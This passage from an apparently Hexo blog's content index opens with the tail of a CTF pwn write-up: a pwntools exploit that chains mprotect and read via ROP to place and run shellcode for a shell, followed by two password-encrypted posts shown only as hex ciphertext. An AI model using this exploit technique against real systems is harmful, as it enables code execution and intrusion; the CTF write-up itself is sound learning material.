class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect_addr) + p32(pop3_ret) + p32(bss_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(read_addr) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss_addr)+p32(<span class="number">0x100</span>) + p32(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-pwn-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu使用记录</title>
      <link href="2021/10/25/Ubuntu%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
      <url>2021/10/25/Ubuntu%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0185247131ae8e418acc25c4ee4d09cd1738d8e0b7b3945a77a392139a9e9840">22064b17c03cb0c0e58c99349b6889d0e918231d1b5b54fbbe954408a3cd5f3fe807b4e04d7a727a47a6c35d51098926f47106adb471d3cd74fc62cdcab45ab047542d7ac503c40f7aa97bccc74f927fc0c42fcbab9e13177304b8a8dce565ab5e3ae6f8924bfc40e973195abafc4fd825c7ea04f6eea07cf7891c141ad7c67095eede65a94c2663e27e21d6ea3480c9405399058e6e92d7378c4c33cfbddc4e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux-Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn的学习记录</title>
      <link href="2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="af843e2e443d3b1c74d6f847f0152400b186cfaa99256c98c5b74265de84a748">22064b17c03cb0c0e58c99349b6889d0e918231d1b5b54fbbe954408a3cd5f3f5c474e191378c173268ad5c4b59ca9836cd9f7a0ccda1337245fbae2dbc743db94716aa43c87b30e66240a2e6bf9c009d51a5b860c9790e5e1a7f6852e6f0bd9c25cee614a040ba1c968cebd1a72511cc1662bb5e7fcfa4ee834b73de95b5fa12fc83683c6d02a12fab382f6bf9b16cdbebf9655992ae7c239733740fd8cf632e49b6755642a712623b8bba988d90010adac5a96f2cc5dd40fa3ad566af658579e786101a05c39ef7c05cf38d27a8976133a7f8a8da90adff35c0f60441b66dd9a05cb2b4f2267cb84c76d774985c479812255509a72d2e29eac56bedcb4c1a95f0020e85c207abc5c4c8dae97a8f2fe133f1129b1ca49692393af0a1efc1fc83de374def9df4d8557e8ae12c214f76aa61d685c12d5522fa3cca64d828855ab5e161c43e20b82ac6344e7b490fd6aa2b43cbdefd4eca677f765685b99fbd5673a847280b8b7bcd65c99faa17b94f4fe9b31aacfa3cb5794ff692044baba68917e0d9af8df7b5cbaa09b9a1bb02f728d28cad116b273958af99eea9e0fe25a8b09f80628067f588c694e2e1c82443e0d1e79b0ca25220bce74ae0ce9f2dcc24c9cf66efed26cd8e0ebea58398c18a101b2cdc8e924542178580b11424a3c502da17587b6ba423618e21ad426c45e96ffa2e37fcad36533a93e6c9eef8ac9f749540e693c57a4e0b47eb5d5332ee7f995ee0434b994dfd5ce24a75d5400c86ba3c7d221a39fb4ad647c882c6cd189862da52930a09a232d56abfd08dacd988c4de925cf663fd36f9c684e63487e700876903c9c1ee46665e955cff46528f4ab56ff73988b2bbd2a82ffa83659ad3c1c408f19c0617cb2ade7bf1a8c6f6b386839499678bedc3b4b1522c8bcda4ddf37f2cfb45224871283306adbde03c20549cd409e9cf545febfcb334547f4cde45ebba38e2c4b015f83bf7b050004e2d8a168ac626c19b03800d85d4fa09867ded9c6db2b046a0466260c85f85fbb9a9d3e39ce85f020d41ec7ff740a749ff7916abaa6e58d474a0a8b6c301412232190c8a061ab1428224021093a928c312a60f507476e8a3361e6a130d6b0f03a6775e49a717794ce08619dd573391c1837d36c624b8c543d67b870c5938b089a3be11d46e46bd254e37207256a3d3918e051b1270caa32039c068d5b95991b1255d17b1c7bebc18f9ce8071443ac6d8e5a7c549ef3fcc0efdecafef5affb707e27958c192dc583137ded1b1194a9eb56595776a171c28c83e5f804d4787cfbf4f7e36ec505529aa6cdb4c7a18bdb0fbe77f0872b3a0c0a777df45a851cecb0b4fd081bfc3a0b903a8d9a2f1869f661c03de539edceae1b6a575d1f9675a3ed7e4b37a2ab89b634d1ec66075b40d56f8a9b7d9bdbf85d85bf1d9334b1aeeb03229bb849b42bac393cb4e5e620f8ddefbd208499446248936f5efefad43adab20e770b366b8a5f86472b75eabe526cb0a6172f4813a38c81b01a4eaf0aa135effb27e4e1b7b60aa3ae89ef4db21fc55a068e44513f96570fe97af52b9f52ea332287e34cbdd8c4e97789d5db97069e9ba2e1105cae66f853393b7e5e9494a2054cc4c4f96b809bc3d65466ccd9fbf1dda7fe37b7e8940b597313dcd24eee8a2aef2fe02ec1335d296e070591d738b615d155e015c92118033255fb066ef5ff32d3b4e4a5bd34f326b58cfdfb4a6ddd14e517c5120eb0898b5d582ea7469bb878f23d6bc4abceac5069c9baabc403a469b777775490e55cc46cd9b63ca9285fd35cce3bb32f87ff3b8373cf77c04d5950318f166cfd95e80522af256811cd8bc00d67b1e473b2d6975dfcad26f4a66745fa27d223d74433056badc18d906f4cc3338e97cf49e9f87ea91956561b100265b7c414bdb17299e09ce7831c6fb66282fd5666e4f7603c1988c3e228377cd2f22aece5b50a5a08170718b115dcd233496d4eaa3bc201e816f7f6f76b58d1bd7e84c4b944cd9b97f2f03946c6e6adbbf0a6f10a5133b20d5da769d2ccea93eeaf322d6b7372ff1ca327e1a59f859e8127a6f451e98f00afc7808dd120074e3311fed207725372c76c9e3437004abbc3e8e65afc365e54be418a358b413fe3cf1b4292d2fcdecac1c79b3c00ee2949b9d5ee3fcd9a014af4d084d78e4d0082ae43fd6b2306c8a109d1f150041a93a8edaf8e0fb74a069ac86a8d07f5956a7d37fdb953021551606c55e837ca2c13ede4aeae1b51325a8f43794521852c0d035b7a28b1648cb32fbca2b465aeda3ce9d67ca2d030e52c15e49211589669e0befa1f98c2af10303c7740e39f7757f127ff9c52623ea36bf90ca907a35bdd299c6a1e00d0fa086d0961bc282ed0fb1109b0b2004252b17fc1296c578a477390cb449e3a151b361b2d562a2871fc13ad259fa862cf27d33c7a7dde9a29fd9898106e83649598df84ba281513cedf14da5f18bbb7276a79ecda5f5945e704901f014e0539d4f81ed53d9973592c49fbb7b97316b2f8650a2dbd36a582b181329b33db752668045fe63afa5e92540ceeaf25d7faaa63210eee617694518d34a5359acd686c7f642d8e1560fd351fbc23404739d5d7fa17d8c5fe518ee895cab0efcbad74af076da05f1f22e8a4a691bdbc2ccd72f6b7ce5ba0416f2cdb59abf0923cb50bfb83f69cb0a38e19018cba9e2f0dd075e79199117ef8f2c599338f0abbcd7c5c422bf2d08165eb17345258b4b55ffaea18a093a055630be5f2f186f29ebce5a235069327b7d6a2aea7885019efb6f2ca2546997f6aac0d535fd19f05eed4b7d5b6739fdfd0f9f8d182428cd314b3b32a51058a090f5d4fbf590f15c8b1948af9f86e136cec1fba25792ebcb2ed563380628ddb7984201ff87b7081eaff3aa855f625a2c6cdc34a28c7eaba23dfcf38464060a7546feee416e4b6812aac29125a3ed155adf20d89c2cd2f10244371c568af6b56f998543ab35e2ff29e37f63819c759e916c742fcac73fcc28e87acb7a05dfe0af47c8285c6bec39c460bdc2905f9f85ae62d591cd4c53194ba886791997adf0fab4d4d186432c326b8cb4d1b19c32f0c74bf350f3a0a8321de72cc653c9fa652280f8a7f9cfb05812f3ac3fd618f001fd4bb1e281f3da4d567a6c2420e6e8ba6a0983819d35bc4351b723f3926c2c59d2b36118ec8a8c2e9f3b68b67df2c1919eb8e62e0eeb1823474784c4ebb0ca3de231c67a89a064193875d42a557841c3de1b984836c4711d7ee87b2ff2b2600cc0cd90627a97a44e5e752e6ede95384dd1b8d41172da79604db5125737ae8a3259ccf39f5297cf82da96bf73bdbd27578204f06cb0e1a80e7e77b4dd7d4661caf9552e4fae6fb5d2d2eba904c60aa58544a7b27a10e71c9ca45e06ac51f5b9995374777bd825ade498a31f7c8e99cab277b9de02d33ce21795c4a1a78678e15a83c8321465ad90ad7675bf236405a534734ea6da1e7fb3c9d4739532124db3a2968d6743473ca481aa6845da5f95683594046afae163c55d3fb52b1478e1786a6087350c66924a9c48903c2d22d3824d63eb268cc7866b163ea182202c19e3af23b86713e069910cd7972bcbff9fde79d6db7d3a4e1ba5372bd06247dc6756aff27d79f90d38424ac4151c756fe7f0a7d50433c074bd6a1b4ff956fb525cda3fc108e9867158b18211f70b82ec118037d99352bda10fde2a9d89a9189f6cf5d152ccc278952949af013f662ddb0f41b00ac05cf871abd026c1dca998d5c7d2acf1ff3239cb927960c21cabc38860b19de4f6dcee88e6045cecc6bda8c1211891868a5676df917616ca85034aec45f82d7210caa58fdd3cf2b805999ee069191c08a64d6b42fedd4bc267d2849d4584c880e1d6feca00b019faa983d59ddca5d565d6ec352b4609b16df04f9cb7760d1b562cc6e5c9bbd6c749fbb0babebdbefbcf324ca812c17a263389356d745f1afc5c9f426d001b297f6ea6bfe3efb541a48fc13e9324c4534f7d25ecba9f7d858534a13ffa786285d265cc44d611949f4beaec35bffd11462c96e9759a5d99aa72ad70b59536bdd05cf0f8a686de70a4355ac8341eeecdac1ec8bf307a6874f8571c0aa2e4d8e383b54635ee4ca63cdab705be1e37b317209e76250119c03732dea9089ea67906682429a0a10840feb450f8cbfac4a197bbd9a69583538ed576ac74966606eae7241f2bb8141966884e7b469f19bcf3f1606d4179e2244adcc270e110bfdf52ac73cc54a07ff848d48f950c01bbc63427bac0dde0bfcacf697bb6775a3f906fbbb32cfef54391d63df5b5c35401678d1a021f4f6fb180bbd57a8fa680e2d8314b3e54a81f4ae38040290740cc476a0a0ac782470212a950e19221e0bb87c3b93a751be1a22a732a4826fb1c5bcb9d46c7b30d6827a5b6f520697bb09fcd73be0b8a1cdb622f56d642da6feacc62b48df183fbb1428063ae59aa0e186c1809c08bd56634a775b07ddb045b14a6bca78687e8988f4b16b1f25e7ee9eb6ccb31dd9cacafc9d1985d0170ff3453ff7692a78b2b9916ada1833f7a5eadf0b32095ac0a46d30d49b778cc8228a971735d02971d9aac9ca77c33a4ee179e6676ff9947ed52e83807e9f367e964351e1b5219b333387625af3d4bf71c4e36516ebecfdc39d6d84e035236c9a122abf29be7eb77c17339da75ad583616aa49078c62eff67374305ad4d894a489cf830195f76ccea4491d9e4e3a9de5a06fa1971a81e15273e98d35abeade0c7737ab848a859df64ca52d1d8cb39677b2c396a0db54c85910dc208f45d7a4d0658e752a05f8a074f49d2ddc53998ddf669a8fc67b9946286a7cb8beeff41bc073f890f881da02fad4e8d5f35a3309dc086cf1a31f71930b6c024c5405b7db9410ca62d8531949fdb5adfdddd47117114c1af4bd021c9c62151a4179a062a68733f7b9b2f946a653ade4da6e9f396c2481c4c2557a62132f7c681f26473bdc4a83b762e589ea4a4d17377153ab7135ec615fe488df38047c2ceab66a09c32937cb5e28c1e16cf6c72043f0bd0559cd2a9ee11459f7a251f9f08f6e46f3754dc364a3429ff033ec4ddaf1b461b5a76a0292228067adf0bdf66f53160d30dbf364aa2c58e29396272b132a8c540b276ca617a14b2165f68fd62a86be7d518aa06b27c13987637163ffcaab2aeb77b9da6edb590172a10b9fbb85536a55f8c8ae218e4a35e91b7dc2e97b6b4741f8ee9db806175f6de67cbb629d45671ea9124166b67f49a29216387b56d1c00a1d163e92cb9ec97a26e6879e3303c93aa8b8009bd659fd0900f53e9da9ca253a59403c9e1e6d08880774ba5bfe7e347b4a65a9831beb71cb03a709355d18c27b10f2a53780bd20a3f0c48d71b9f97cd5422326c0beffd50d07af503b63a328ac39136863041bf67ac1445a4f5772f3f66586adaf5cc757687fd41512851fbec796eec045c07c0e8cdf995eb7b3cbc80c3390a487172df0408079191f2e117c1a5ef78023de05cc9bf3f9d63be49254b494d8123703ecb1493558fb46841eeb84c6ff0b3bee519688a02e9f55734d748ba9b21339cf971ae2506576c5f8cc5fd82429e0abda8447bf9baece42ad81dc957b685a35d2fbc05540e8dcc3c632329823336f030fe97c134adeef2965b7a710f2fdf6055599e478c2493f8c1cf04bf00abe21268084fc311b6204ff0d289dec815f88eecf83bc20de5ea986ff8dc04a6b11e8ad38a5a3ab94f44a68b7b92eeffa1b97df39feb42699b25a467d2dc77c0374431967088a6e13d60786426ad00d773f2c114ce0f56f9fefbf3d816cdc96b7fa07dca79b0d79f7ed5c077a9619c48f3a99e535fac2e93a52dd333edf51b1196e3fd3705d9e77abadfd9eb3b593def586ba8aca20268c3ecaa466ce8aee6d0e572f6b678ccf669190cfc9900e46b9dd146a11dda220f2510c6a4f766c265f9bb85d136f88b525be9452ff8734dd7464c2304c8bb2598c2afd2d17e476f7a232a5e6d1d6dd00a44583b0981b97a811d6b9a8dc2a4af681f8f7f5fe2f4c85fdd62bbde99fdf8803640d512c60161d8a143fe4a88aa1a64e66ef08d8ebf605df3a9d754d4647ca92275c54e3c5f8544451de25d2425bc4c08036baa3240f22214bde56a4c2c01c5d35b6167fcfaffd67b5578e51c02c42dee70dc89b587c55db0182d78ed982841f6eb5c94053ccfb40e8ee050c21008bb7b00721fd5823886b98afc491e90d997cd8756739c7b69afad4dd69aea9925c4f7164000a37c67d8e1c8db591f4acf915e9e48d5021fa57af5becf23295a5dcef859f8d495b18f8cbdf62cd28b06a0b06d5035f5bf8284bc98a126f7d73a3ff6d728b32f85ecf67b517b7807e9831dafca2c62f3643526819d3f7ca58c4955e931a7325985dcc35d4e3979ba68558ed987ab081b13ae59cef1e774a8a3ed8edd4a5f7580ca718cab3c28367dad705c98c4e8c683e08c7ba401e8877a9bfdc9a13431de075ca083966238e95a9b192e8e30b716189b22f12816157a9393340128d2305a12c0a5d1d0b9f0746b7d6cd8c5c4070c659aef03bc46480dd4762645f750afb43e3d5d634703e8e776f15a0a73cbb0736edbc27b6b31e32aa846d761a5f7394811a10daf47778b2ad857f85e39d91c2ba30cf17a0ff13207420541355d1c259ebf1c2d5f1505b5b6a747f1fd4096616fa26b9ce77186dfafb863e4401925f218b11299e148b5474f51147a8b46b093a27c6166cf93f8bb0429b63f5f7f8434e4e352fa2f764656c345b2be8529a7d4933896d0596c1fc170a2e293469dbbf78ee69b2f5e025ac0948bbd88d9663abdbb6bcbeafdcd04ecfe63441376e9f280679f8fa3a4d14231e83470cba1b0af1e568be05e7ad4ffe43acafacfbfd90a0054e678263e231ef2e2633ea1830f766a3d39b5e97cbfad0ffcbe35910fb7843381d8b3e3c61324d1104283754d7b166ba2b5802878aa60b9eab3f650d1bc9be637e83323ac2d4bb8588409afcbdd2800c2b5a6b83d47ba0b99e28db417381748c842c34977b37a5e6d883537129cde307cad1745bbe37e0f40dfad621b821452df515bcd2583ed902f260f27f1ab52e54921216570579b6ab699876100642258fb5d5904bb498e652e14013eb1ad9dbfbe6de071df2df3f4d899f5646ca8ce1e8dca4b59eedcf2ec6a6cbb1a785a1e2ad7b40149fbf8f75e68a0bae67c086cbc125140e5adb429e9477197da599494bd64d6b51c6844c6936a5f20b3763c48bdf5f984e1208694779fd5a4a17cb0f70d56a57a2e29645a189701bf6819d54e4b4aeb2d0d329e3c25af2538137d118ae6fd79ee21010047ae1e630e768e66b94cd8487426850f8017a498d2b54ad67a5cf100912714b17fbe98a9d6be924b68624b5b86ad4906a0fe02a3c2ab54fe0206f5bfc16bbeaf9ee03a8b609062f09fbd8a62912652758d443c79cd8b43e72922765776d5bd89ebf265a759bb1f2c35f1c75b8d9e2eb398abe6bc31767eaafd90d46fe109f6cf866178ecf76400feaf2c5547dcd96a3e8bc49bb0676f6ac664cd73b39f022c72bc29bdf1a8fe9efe83c52133b92040975a4196e241a080eb215b56896a35da2bbfb302614533028a824b8ec8c7145060ea827b2ecef4b7994a2acdbfda3a28e7a51bc1f444a9bbcd9bf9deae6eeb5338104e467d52714acbb717d5a917872044078a0e2106d78e676237c1e10316227f95ad22fa96224fdd9abe698cc193e35b433f300219bfe1e8cf5fe97b804d4cdb8b1b4b9d82244203df513c8740d3b16df8392649006e7ee73092d36a8faf0ce26b37b406635831cba1e2ffc52fc0825ca2b5f48a9fde19c85e265f7606c751a8b1ffa125574804e4578f54ad6618782ef605b235a8c2a1235bddf7bb4073f89a3d271882e448ab59efc7eeea8a26a1ea58f49a99aacddb498b4a8f6ead41dc1d6df65bac17f9d899afb70dcf549776dac526ad7e36fc8b23c40e5f7d04b00baa2684e5905767f828ef8ee13b92d94c6bc249af4a1558d60cff7583df9146b3021edb826ee5c510e2ae7e31beb1e44e86bacafa0c9aea2120751bdb422f95353ba07f3e1ebfc74a36e91dad70a26469c38e4a9430e7a8ab8a9c28a97631e214de36a5a246e4c622e28dd6736b7c29366fc1d8909519b21a89e68fb2b8b3d1eeb129d8b20c159410d746312bd0695c9264a0f4a44e468267500ac44981bed1d131dbe551b83fbd1dc89d24192e3255d43898a03666ee47547ad23667a8370e6b4515056ae2ce0548389e86a3f672788c2a702f4575099a80e3e8f9415a8bd38dfb5c840635f7739a778702d263a3c4c0f7ba56a46970fc8ce149f55bd8e24bd56fd00a48ee365c8b6f58978458ba079f696562737ee837459098332784b3e048e90072aa924f0b4e427ad854239864fba0b318b0cd9dc465976851d9e9c53584c3f465ab2be732815d4e8732a7f1058c2d724e27aff07c06a6c2995c667c42d97ec49b304ef6adbfefa759b2ae26ed7c51651f5abde4b838ecaa0087412a27f6b2c968681ec247716de60cbf7b820601a5d9569df90fc6d30cd3b89fb6920d8f9b7b3d12c42410d3059bf47c62248420b2ad3fc07e4c0ee4746fcb51a76650bfbced405c87e2065f30c0e8e584ba10622791675b849c446c883df9918c4eec34809e74b95494efd55723e19c882edb1f5b70204cb46d2f87e6821bf98a42cbc23500531d8294791cb9572e8ae45fb3cc795d2c4b17a75c11ef7b3e8d3fc365f26ae6a893eeab2856053085a6aed90b3bd266b8939175ee9f80c978e1eddc73952bc2be376b9d286b858ef0ce9aea4e7bd28f2165a36754d3b083617a37f5f936b820dec3ad3c2883b09a5021209a5bd63096c9d3861cda0228bd177810c9d6c93dbf0d2e47122aa4340cd68f6f2b8292786a0d21134f4874fb8db2a0f22c957cebb8400c9898ef7c5d5cc3b95d97d6f59cc4151e40d9e65ac081a2db5ab6313c15cf26fe4ad58644134f79971bdbceaf077a9921e1aa622d98492a9755430dacf1919d2fc387632c9e57dc5f9aeffbc88f6649d2ab77bad7e59762c31d83f21b4f7bae105a0268303028272050a646c30cabefcac94f88218aff3657ee47abd620eaa6c8a0ada60598aecf3d2ab7bc6b9ffcf7cf40ed245a0ad6d1c3837ffce88b6c8c02f6cd9f7a588560ed9086c7f50b1f7d7855f2a753e11d089141d5154fe061c8845a0cbe2a604850241ad42d82a3473403a32cad5aa96d5a4a9691f9c62facdccc33946da1ede137ab3c28b583f06964dd7e7ec7775b05c8d94719eb32145f4cb84570e7566a643e7b8912e1eb9b91fb669dc94508991668faed45e19aad76c5e7146218055e680b5f82671be84561e26022b0b2a4aa3f578cacdc5dcef76c34b05b9b7d04f01729f6a1ce8c5442507bb5778a6342676697ad1fed1d899da3f6aac872151777930602c1e1e07fa0fef1515135c40fb5bbb14de851e14489b498dfe960c25ab3896c8e0284c5e223cb4e9aea8d430569997e2e767ba3e0fd658f8779931dd23246bf2dc592598804c8ffd454df04c4e4044aa7a28b85dbd74655c3d187e74c19cfd00e857c3da64a644070ff8920b7ee99e6b0b25546037f82691d96da1fa4c4336c3cf33f59f5861b3aff1b0d482546801ae6ac9c8adea7035659fb8ca5289837db510ccfc6329777e45a25bcf0161b37b0fa30a9fad0d0b013d71c46501e186aea131a758a326b08311c6184e7820f51a7d9e227d8de02708b297a1288da13aaacc271498d8a7719ccf8dbf139972856dec208f7221f691a29ac205361a4291472b30eb8ae62491e03fbe75928ed3fd9bcc6d11882f4a96d54f7a2137b730e126d4156be023cdb022274de2feceb6102f836280959479ebbd32dd3e69ef3248ef5e7a78d18c3e9c005962b3e1204e35ca6d69d552dcf7139258fd6ed5d56e05cb787a1ce97b079504f1029e6fd33c6c2cb681e3bf479e0d59e03c6e371a2b4cbdb9f82b76121b8d79229b8691f92a3d2a2f22c7de5e4da00702a397cb476f36c268a5eafb4aef402cd69ca136c73c99797ac1ee37b50fd9556d8bae76a2bdd0548697af94c0f450bb1cf42e3f6a2c585e635f065646d576f9d66b2b922f542fe5a5acca6484d0c23816fd54bd94b39809b1f4149503f0083f9b827a4fde7d39433938eb3eee395a10013ed818ed905d56ad924f93ac3a14b8c7c7d7513ffe5730c005d806858861c1bd17040282e22407a8a76f316dddde9cc09b62cc06a704814667064a2fb414ee4b88261895c2fedf851d42d01619a83a8a50ef806de15bf197a14073cf8fde78481968d88f817e960c81784b8f26de6897bbcf3a1a6f9f26121dd8bb388207be69833b3b5e6372a56b81d778b6688b0a140ee2e6682d30e081232be2aa6e96009342487f3f17948eab0fa56498c7f69f344ef9d20e566e9fe2c4d21580ee8ac7a2629886b1179f0e9aa08eaf97aa5f3f5c7c723665bd6547aa15777080196984d7056345d3ef41b0b4bdb3c46ff425454ca98146b3b80325c289458c133186f67d9fe2df467e1fe0c795ab57fa058f45c3c52fba6dca7ebd102ee9afc00627d8b41ab3fdebdcd1147540da44f72ccf919f235996eb105a9eeccdb408a8d8682ccd54c1994d10d6d402355e1f7ba5f866591b05d02a697f0d5d5a440aaaed3a66bc2101ac12ca0f90d1688366fe25030824d5e7f4e0fc49501aabc9200566049324db76ce45181dd26d55ceeb6eede495ac6e56d5089164d6b81472042ef73604663589ab1541f1264d27ba3e15058b0327111cfe623143c4491a3ec3f14083a0db7673ec702d7319fa69b99790f0adf5c169ca347415e4363287fc2f54eceb9bfef1b71362edc2843567355834552483986ee71ac1d4bbe918a3768eb1f316c5c248c77a0a861ef683d5e8f0ba86e1e116c8c7c72a44ec1a2fd900d0650b2eab387450caebe865bae6873825fb38373101bcafed9b3c4d42c70b6ec984b197900a3f1fcc195c31e48f86419cc4013b4270a108e02223ea00e3ddba1c681da3595163d41eac1843b64f3442e7377bf110c668c3705c4e10703c7e276deaecc4f7e854c65ae210bcc3c22620559903e087c1609f80b3bd7217f288466c3582768d68eacb8b6b62c3ef2fc2a2ef52ef5cd3e50b9c65d0fdf51c7a89e44309ff8043be7587e82ed7593cc9f60fda0f96da55f8c4604ac30e980be7eefdadd2e79a8342f6c2f0face8b34f7611663b1ddf2ea186eb69a7798b9d15cafefd8644686cc4c7a77088a6bdb2a2b96d56c27686643950a639c6b2958e78aed4839594a2326e8a3bf4cd490a76cdfd80e39b1acf045669d979924e2ef836c9ebbf0640b3c0fbb9b40db35a683d39c047500ffce757beea8c77b48933c73f899a34477f3e4e11f7fb4255217104703cc25dc316b5ee32e335e42e0c8ae78a15900e55d541fade2bc55cb1c0c61fc69774ced8932f25d4bce387b4ab176e3d8d2edb26c58c3a0f716fad4add9feeb1c42c858e0696624e795a0365f32679667e620d190ac190f525aa6072b730106e1d3dc561ac84267c0d6e6cdd2ba09c30f053969e0d53e207dd40c3c835a91f5c34d343b4bfeb371385a59bc7e5bb6c52af273d2632a51851e0f65f84d5882c369781fc438c45d2531f461a5027c0b179fb06a292b763125135cf616a0a1db76ba545ef834629be20a0244a7467760e4737f2c43083dc72be8729f22bf672d7f5e33ba9cd4bb2a16f9ece1d0f4a477d5a7b1f24b5736459c85d3803fe303aa3f4eb2fd9786ea5343b1f7230862c12af6a08c6f1e2deb853956ecadcd8cf54f9980377793dab9b6f43d37dab40521c59dd13d8fd506f07b9324c7ca7a0ebb071fdbbd0497f5f0dbcf35bd72a658ab6f956a63e1f449f4588a826d8d4db3e9bdfbdb744f254db550df742d38e4c172eaf0763d97f37f82bec87d02ae55e9ea048e508b1140423b6d95ff7c58e59df532237928012ed1aa7a34b889bf7dc61cc11c4e780a91d9f32b38cdc12e720ad95dd3642f89a3f59b31bcd7d071a41b843782970a0dc2887d4261b87d57e596d5bc8eb947178b551282a888b6ff1bba0f19fa33261c89908808dd46eecac141e62560aca627509af634ab7df348aa2e67d61244044867616fdd06fea49e589963af6b567a5af099cc503ac371443b3439bb0660939122f1501b4956ef46e7788ad8dcf943e476536316e1f4e4e0fbac15f21529cfa6bb243cf3de7220a299ff8fb88deacf32fd56db34c7a8302fbd41c8f461cb9e1c54b0a4561d9d4d4dedd0016721b581615dfc779ab52ef2929dc31b3469be637730e7e2ffd27de13b5d92cdb876140450d365b9c6d2e5631b3d6276498ab1869656189e627bc0b7fa66eef5590f84a3d73f5a4981b71a53df99e311d95c8bd4ab36e89e5ec46f55deeeef16b8e11bd602b758b0dc199b822d9b658db4708f03192c053834556627f984a053718f054aa58d45605e2f1ee58e538ed626c616d5ebde196d0d1eaa5947adca870f6a1668c370eefa27809d478910f09e7c1d6df3adf662692db297570eadeaf7c4dec1d30dc12a9c3c29b575f85fd09108ef5221ff4c0a153ece62e38e3d0ef56c8796b22cc5b6b7b7b6188853a7519d53512dae173417f125c8d27c25220f882c09b003e92c600867d4d34eeffaacf80734b8c4da7a3656ba5692363ca276788a6aef31b5f39e2b90b494bc6c5e6c28bfe238bd5464342cc95adfab68ae97b612172aeaf5413a6633acfcb42fcd6edf91fabe8336373b83ead41cfac45b8a47c21c516d1cfcf1c7743388c3c8603f8f5f5e1daa99f4c080d83430ec8fa48b09869a49ed5d4ad9696f740e1b4dd7168f1ddaae244b8dfabadacc534a0de32a293910356841a554ae6c391acf3312142658e2dbfb33a7a2573882bf877e8cc390400f2237620941f32b136fc5b1512793c393837911d182d0a16da5313a4dc8e5919855913abd9f6180016caafe23e1c77f9536e3b545ec0cbfc4066489691334883493b9ceca8571070874055c1751d6d785cae23932f0543fc30c8597bd0fb3b8b4dda9aa2a28e41b8aeaf9e80df1368ebf832c20217d539d51e0f0426172cd417bbae61fcddcabd02521fc1124139bcb9bd41d77b6e7a8b9ad5494eaf241613728d04d8c40c4b5c33478bc8febf7bc161c6a430c1705a43d84cd59d6eb55cd1c6d285a7c97125420d30137996dd4c0781bfff83a436d3aa8c9ac9ee4751f4e21f7ce09e73869784248e8ee86a0cc6d446b74c80be96694ee4092ddc33ecd6e0fa734e6da71cdc0b45417d80d1202cb4bfa199a34b5d7374e6ad51f63bc008bf657865f02fea74a314d5fabde08c2ee88aec0d22df6537ecb9d44c573fb3afc5fd842f8ab960c19433f1421bdc30a2dbdc73492de847ff3ba115399ad8b82de2d6ad1c981548448d608af3ecba98fb8ac92e5b965cb068ff0534e27fd943e6812119aee3edd663e0a63e703c69907e19beec553b045718a6043a7a897078600b0df4f462ddc2afcb6b920f5379c096e5e565be21c2bb67eb5919c5f608a67f36b01bccc26b9321435b33d1bbddc1182993f10d577c4e7d12acb89b7e5ece017530068b92578f6988104a77be1e00e1bb3139150a4458a429e12df82c8121ae26621453cb69a8ec6ac1cae8933a51c0bed05a6ad158269244413461e91cc9b420d16d9e0dbdb3249be601f7d045b94623fdb9af62352507bd3b7e19a8a08864c9a4c1f6e5a53d322e3f3171653d379a330670db3a8dd681230731674ca32a6ff36de86e278e4bf2195c58fd9c7c9c2e3577378cf96b620bf3bfe45c076b36a68268ba54806bd51e8c23b2c3fc86910522456eaf9f73c125ebe461231dd51be37205222d4d028cf988cf56e9a7e48d98bcbd1fb94e1e5f9410cf4be63f02de2db8ac9915af5f8cdbc0f58d1d52b997e992ad5887b857b0adf2b67a1999ae6488a259fb1391bc2236a5895682124e4710ed939a91a618870c3913b1d89ccd0e41c1ea33b932017b18c6967544b39cbf2a6fd0adab620eaa04fb462886d59c6787bb01dccb928efebcb9bda9785abbd5e9beabc22a0e9271aa2fd032b67f011a4f811b0306cbf233d325a21ed7e90a5b782fe5a9c69314f73be47a6c995d8c29105cb22b21eaadf4935ac9e662f1e11f95b53a0ed46c3bf29aa4f04a6695d459041c17e4cd374f819affa2185770fee64ba615d52e35c454c01b43c2ec8e9822821b03a3ad0663b7336d792a7a417ced302dabe388e16c4c03130d966a173a8eefb72864a09d7daa4f5c64e4d240467edc8c3647c2292a796adc1323e14bb87430f512b653e1ed5aaab8ab2a420d2e7d8352a93b517a3b9d455788db91a50770a7d910c34f953ae84c6d17ffbe65236e95934a20599891fe02f4b8d99a74cf6a5ca5e5f3bab06f3679391b5a6ef4960822c686c47e21b319bc5c59bb1ec475aba906d6a314d06d5c27364e37251355adae5a7d1218deee8271641929e2b6a45db800fee257ae3f1d4bd82a3a7ed4b1bd14e7975d6c51900036a3d397a0debee871605f2b3f10abb7be69c9db44a29b9e2801a36